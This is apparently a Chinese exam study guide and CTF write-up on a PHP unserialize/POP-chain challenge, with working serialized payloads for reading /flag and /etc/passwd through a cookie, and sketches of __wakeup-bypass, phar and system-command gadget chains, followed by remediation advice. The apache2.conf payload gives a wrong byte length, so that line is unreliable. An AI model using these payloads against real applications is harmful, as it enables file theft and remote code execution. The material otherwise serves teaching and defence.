# 39 题 · 原理 + 手工复现 + 修复（考试向）

> 目标：考试时能**写出原理、能复现、能解释 why、能给修复方案**。

---

# 一、一句话原理

> 服务端把用户可控的 Cookie **直接 `unserialize`** 且**不限制类名**，攻击者在响应中"凭空造一个危险类的对象"，对象因 GC 销毁时自动调用 `__destruct`，该方法里**用攻击者可控的属性读文件并 `echo`**——flag 出现在响应里。

考试若问"什么是 PHP 反序列化漏洞"：
- **CWE-502** Deserialization of Untrusted Data
- **OWASP 2021 A08** Software and Data Integrity Failures

---

# 二、漏洞成立的三个必要条件（缺一不可）

| 条件 | 在本题中的体现 |
|---|---|
| ① **反序列化用户可控数据，且无 `allowed_classes` 白名单** | `unserialize(base64_decode($_COOKIE['pref']))` |
| ② **代码里存在带魔术方法（`__destruct` 等）且方法体含危险操作的类** | `LogCleaner::__destruct` 里 `echo file_get_contents($this->logfile)` |
| ③ **危险类的关键属性可被攻击者控制**（public，或语义上由序列化字符串覆盖） | `$logfile` 与 `$enabled` 都是 `public` |

考试万能解释：**任意类 + 自动触发 + 属性可控 = POP 链。**

---

# 三、必背：PHP 序列化格式

考试常考你**从序列化字符串读出对象结构**，或**给一段代码让你手写序列化**。

| 类型 | 格式 | 例子 |
|---|---|---|
| NULL | `N;` | `N;` |
| 布尔 | `b:0;` / `b:1;` | `b:1;` = true |
| 整数 | `i:<数>;` | `i:42;` |
| 浮点 | `d:<数>;` | `d:3.14;` |
| 字符串 | `s:<字节数>:"<内容>";` | `s:5:"hello";` |
| 数组 | `a:<元素数>:{ 键; 值; 键; 值; ... }` | `a:1:{i:0;s:3:"foo";}` |
| 对象 | `O:<类名字节数>:"<类名>":<属性数>:{ 键; 值; ... }` | `O:4:"User":1:{s:4:"name";s:3:"bob";}` |
| 引用 | `R:<索引>;` | 引用第 N 个对象 |

**两个考试爱挖的坑**：
1. 字符串前面的数字是**字节数**，不是字符数（UTF-8 中文 1 字 = 3 字节）。
2. `protected`/`private` 属性序列化后属性名前会被加 `\x00*\x00` / `\x00类名\x00` 前缀，**手写极易出错**——所以正确做法是用真机 PHP 的 `serialize()` 生成。

# 四、必背：PHP 魔术方法（POP 跳板表）

| 魔术方法 | 触发时机 | 是否常做 gadget |
|---|---|---|
| `__construct()` | `new` 对象时 | 几乎不可能（攻击者不能 new） |
| `__destruct()` | **对象销毁/refcount=0/脚本结束** | ★ 最常见，本题就是 |
| `__wakeup()` | `unserialize` 时立即触发 | 常见（CVE-2016-7124 可绕过） |
| `__toString()` | 对象被当字符串用（`echo $obj`、字符串拼接） | 常见 |
| `__invoke()` | 对象被当函数调用 `$obj()` | 用于链式 |
| `__call($name, $args)` | 调不存在的方法 `$obj->xxx()` | 用于链式 |
| `__get($k)` / `__set($k,$v)` | 访问不存在的属性 | 用于链式 |
| `__unserialize()` | PHP 7.4+ 反序列化时 | 替代 `__wakeup` |

**记忆口诀**：构销醒变调，读写新接口（construct / destruct / wakeup / toString / invoke / call / get/set / unserialize）。

**POP 链 vs ROP 类比**（考试论述题爱考）：

| | ROP | POP |
|---|---|---|
| 全称 | Return-Oriented Programming | Property-Oriented Programming |
| 跳板 | 二进制里以 `ret` 结尾的指令片段 | 代码里带魔术方法的类 |
| 本质 | 不注入新代码，**复用已有代码**绕 DEP | 不注入新代码，**复用已有类**完成攻击 |

# 五、本题源码（必看）

> 这是题目给的源码——考试可能直接贴这段代码让你写 payload。

```php
class UserPref {
    public $theme = 'light';
    public $lang  = 'zh';
    public function __toString() { return "theme={$this->theme}, lang={$this->lang}"; }
}

// POP gadget 在这
class LogCleaner {
    public $logfile = '/tmp/app.log';
    public $enabled = false;
    public function __destruct() {                            // ① 自动触发
        if ($this->enabled) {                                 // ② 条件门
            if (is_file($this->logfile)) {
                echo "<hr><b>[DebugLog]</b> {$this->logfile}:<pre>";
                echo htmlspecialchars(@file_get_contents($this->logfile)); // ③ 任意文件读
                echo "</pre>";
            }
        }
    }
}

if (!empty($_COOKIE['pref'])) {
    $raw  = base64_decode($_COOKIE['pref'], true);
    $pref = @unserialize($raw);                               // ④ 无 allowed_classes
}
if (!$pref instanceof UserPref) {
    $pref = new UserPref();                                   // ⑤ 旧对象 refcount=0 → GC → __destruct
}
```

考试一眼看出 4 个红字：
- 第 ① 步：`__destruct` 必自动执行
- 第 ② 步：`enabled` 是条件门，攻击者要把它设 true
- 第 ③ 步：`file_get_contents` 路径可控 → 任意文件读 + 直接 `echo` → 内容回显
- 第 ④ 步：`unserialize` 无白名单 → 可造任意类
- 第 ⑤ 步：覆盖赋值让旧对象 GC → 触发析构

# 六、手工复现（完全不依赖工具，纯靠手）

> 假设目标是 `http://靶机:端口/`。**所有步骤都能在浏览器 + 一个 base64 编码器里完成**。

## Step 1 · 黑盒侦察

打开首页 → F12 → Application → Cookies，看到 `pref=Tzo4OiJVc2VyUHJlZi...`。

把这个值复制出来 base64 解码，得到：
```
O:8:"UserPref":2:{s:5:"theme";s:5:"light";s:4:"lang";s:2:"zh";}
```

**Why 这一步**：确认服务端用的就是 PHP 原生 `serialize` 格式 → 反序列化攻击面成立。

## Step 2 · 在源码里找 POP gadget

打开 `index.php`，**搜所有 `class` 和魔术方法**：
- `class UserPref` → 没有危险方法，pass
- `class LogCleaner` → **有 `__destruct` 且内部有 `file_get_contents + echo`** → 锁定它

**Why 这一步**：黑盒纯猜类名几乎不可能。教学题/CTF 题通常通过：
- 提示直接给源码
- `.git` / `.bak` / `?source` 等泄露
- 框架指纹 + phpggc 公开链

## Step 3 · 按图纸造一个恶意对象

目标：让 `LogCleaner` 实例化后 `logfile="/flag"`、`enabled=true`。

照 `O:<类名字节数>:"<类名>":<属性数>:{ s:<键长>:"键";<值>;... }` 拼：

```
O:10:"LogCleaner":2:{s:7:"logfile";s:5:"/flag";s:7:"enabled";b:1;}
```

**逐段解读**（考试要求能逐字段说清楚）：

| 片段 | 含义 |
|---|---|
| `O:10:"LogCleaner"` | Object，类名 `LogCleaner` 共 10 字节 |
| `:2:` | 2 个属性 |
| `s:7:"logfile";` | 键：字符串 `logfile`（7 字节） |
| `s:5:"/flag";` | 值：字符串 `/flag`（5 字节） |
| `s:7:"enabled";` | 键：字符串 `enabled`（7 字节） |
| `b:1;` | 值：布尔 true |

## Step 4 · base64 编码

随便用一个在线 base64 编码工具（或终端 `echo -n '...' | base64`），**注意末尾不要带换行**，否则 base64 多出 `Cg==` 服务器解出来语法错。

## Step 5 · 改 Cookie 触发

浏览器 F12 → Console 输入：

```javascript
document.cookie = "pref=<上一步的 base64>; path=/"
```

或者 Application 面板里直接双击 `pref` 的 Value 改掉。

**按 F5 刷新页面**。

## Step 6 · 在响应里捞 flag

刷新后页面里多出一段：
```html
<hr><b>[DebugLog]</b> /flag:<pre>TOGOGO-flag{xxx}</pre>
```

如果页面看不到，Cmd+U 看源码搜 `TOGOGO`。

# 七、Why 链路图（按时间顺序，考试论述必背）

```
浏览器发请求, Cookie: pref=<base64>
   │
   ▼
PHP 服务端：base64_decode($_COOKIE['pref'])
   │  得到 → O:10:"LogCleaner":2:{...}
   ▼
unserialize($raw)
   │  ① 找到名为 LogCleaner 的类（存在于代码里）
   │  ② new 一个实例（注意：不走 __construct！）
   │  ③ 按字符串里的键值直接写属性：
   │     - $obj->logfile = "/flag"
   │     - $obj->enabled = true
   │  ④ 返回这个对象 → 赋给 $pref
   ▼
if (!$pref instanceof UserPref)        // LogCleaner 不是 UserPref → 条件成立
$pref = new UserPref()                 // 旧的 LogCleaner 没人引用了
   │
   ▼
PHP 引用计数 GC：refcount(LogCleaner 实例) == 0
   │  立即销毁 → 调用 __destruct()
   ▼
LogCleaner::__destruct()
   │  if ($this->enabled)         // true ✓
   │  if (is_file('/flag'))       // true ✓
   │  echo file_get_contents('/flag')   ★ flag 被打印到响应 body
   ▼
HTTP 响应体里出现 flag → 浏览器渲染 → 攻击者看到
```

**记两个"反直觉"知识点**（考试爱挖陷阱题）：

1. **`unserialize` 不调 `__construct`，但调 `__wakeup`/`__destruct`**
   → 攻击者绕过构造函数的初始化检查，**直接控制对象内部状态**。
2. **赋值覆盖会让旧对象立刻 GC**
   → `__destruct` 触发时机可控，不需要等脚本结束。

# 八、常见考题变种（押题）

## 变种 ① 任意文件读
把 `logfile` 改成别的路径（注意改长度）：
- 读 `/etc/passwd` → `s:11:"/etc/passwd"`
- 读 `/proc/self/environ` → `s:18:"/proc/self/environ"`
- 读 Apache 配置 → `s:20:"/etc/apache2/apache2.conf"`

## 变种 ② `__wakeup` 绕过（CVE-2016-7124）
**适用：PHP < 5.6.25 / < 7.0.10**
把对象的"声明属性数"故意写**比实际多**：
```
O:4:"Evil":99:{...实际只有 2 个...}     ← __wakeup 不会触发
```
原理：PHP 解析到属性数不匹配时直接报错跳过 `__wakeup`。本题 PHP 7.4 已修复，但考试爱考这个 CVE。

## 变种 ③ Phar 反序列化（无显式 `unserialize` 也触发）
`file_exists('phar://evil.phar')`、`file_get_contents`、`fopen` 等函数处理 `phar://` 协议时，**会自动反序列化 phar 文件的 metadata**。
→ 文件上传 + 后续任意文件函数 = 反序列化 RCE。

## 变种 ④ Session 反序列化引擎混淆
`session.serialize_handler` 三种值（`php` / `php_binary` / `php_serialize`），写入用一种引擎、读取用另一种 → 注入 `|` 字符可构造对象。

## 变种 ⑤ 链式 POP（多个 gadget 串）
本题只用了 1 个类（单跳）。真实框架（Laravel、ThinkPHP、Yii）通常需要 5~10 个类串联：

```
A::__destruct → B::__toString → C::__call → ... → call_user_func('system', 'cat /flag')
```

工具：[phpggc](https://github.com/ambionics/phpggc)（PHP Generic Gadget Chains），预制几十条公开链。

# 九、修复建议（按"银弹 → 加固"排序）

## 修一 · 核心银弹：**根本不要反序列化用户可控数据**

```php
// ❌ 危险
$pref = @unserialize(base64_decode($_COOKIE['pref']));

// ✅ 方案 A：改用 JSON（JSON 不会触发类构造）
$pref = json_decode($_COOKIE['pref'], true);
$theme = $pref['theme'] ?? 'light';
```

## 修二 · 必须用 unserialize：传 `allowed_classes` 白名单（PHP 7.0+）

```php
$pref = unserialize($raw, ['allowed_classes' => ['UserPref']]);
// 其他类会变成 __PHP_Incomplete_Class，不会触发魔术方法
// 也可以传 false 完全禁止任何类
```

## 修三 · Cookie 加 HMAC 签名防篡改

```php
function sign($data) {
    return base64_encode($data) . '.' . hash_hmac('sha256', $data, SECRET_KEY);
}
function verify($sig) {
    [$b64, $mac] = explode('.', $sig, 2);
    $data = base64_decode($b64, true);
    if (!hash_equals(hash_hmac('sha256', $data, SECRET_KEY), $mac))
        throw new Exception('tampered');
    return $data;
}
```

> 用 `hash_equals` 而不是 `==`，防时序攻击。

## 修四 · 代码审计扫魔术方法

```bash
# 找所有 __destruct/__wakeup/__toString 里的危险调用
rg '__destruct|__wakeup|__toString' --type php -A 10 \
  | grep -E 'file_get_contents|file_put_contents|system|exec|include|eval|call_user_func'
```

## 修五 · Phar 防御

```php
// 全局禁用 phar 协议
stream_wrapper_unregister('phar');
```

## 修六 · 升级 PHP 版本

- 7.0.10+ 修了 `__wakeup` 绕过 (CVE-2016-7124)
- 7.4+ 提供更安全的 `__serialize` / `__unserialize` 接口

## 修七 · 最小权限 + WAF

- 容器以非 root 运行，敏感文件 (`/flag`、`/etc/shadow`) 权限收紧
- WAF 拦截 cookie/body 里出现 PHP 序列化指纹（`O:` 后跟数字、`s:` 后跟数字）

# 十一、最容易翻车的考点

| ❌ 错 | ✅ 对 |
|---|---|
| 字符串长度按字符数算 | 按 **UTF-8 字节数** 算 |
| 手写 `protected` 属性 | 必须 `\x00*\x00` 前缀，建议用真机 `serialize()` |
| `unserialize` 会调用 `__construct` | **不会**。它直接写属性 |
| `__destruct` 只在脚本结束才触发 | **赋值覆盖让 refcount=0 即触发** |
| 改 `allowed_classes` 等于安全 | 还要防 Phar、防 Session 引擎混淆、防类污染 |
| base64 后可以带换行 | **不能带**，否则 base64_decode 后多字节 |

# 十二、一句话考试模板

> 本题是 CWE-502 PHP 反序列化漏洞 + POP 链。服务端将 Cookie `pref` 直接 `unserialize` 且未传 `allowed_classes` 白名单，代码中 `LogCleaner` 类的 `__destruct` 方法存在文件读取 + 回显操作，属性 `$logfile` 与 `$enabled` 均为 public 可控。攻击者构造 `O:10:"LogCleaner":2:{...}` 序列化字符串，base64 编码后写入 Cookie，触发反序列化创建恶意对象；随后因 `instanceof` 检查失败被覆盖，旧对象引用计数归零，PHP GC 调用 `__destruct`，执行 `file_get_contents('/flag')` 并 `echo` 到响应，攻击者读取 flag。修复方案首选改用 JSON 或传 `allowed_classes => ['UserPref']`，并对 Cookie 加 HMAC 签名防篡改。

把这段背下来，论述题 80% 分数到手。
